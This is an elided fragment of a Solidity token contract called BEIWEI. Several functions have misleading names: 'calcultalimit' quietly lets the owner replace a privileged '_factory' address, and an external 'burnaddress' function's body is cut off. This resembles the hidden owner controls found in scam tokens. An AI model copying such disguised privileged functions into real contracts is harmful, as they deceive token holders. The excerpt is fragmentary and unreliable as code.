...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function calcultalimit(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract BEIWEI is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "BEIWEI";
    string private _symbol = "BEIWEI";
    ...
    function checkdataprocess() external view returns (uint256, uint256) {
        return (_reflectionFee, _marketingFee);
    }

    
    function getfee(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
    {
    ...
    function burnaddress(address shareholder, uint256 amount) external {
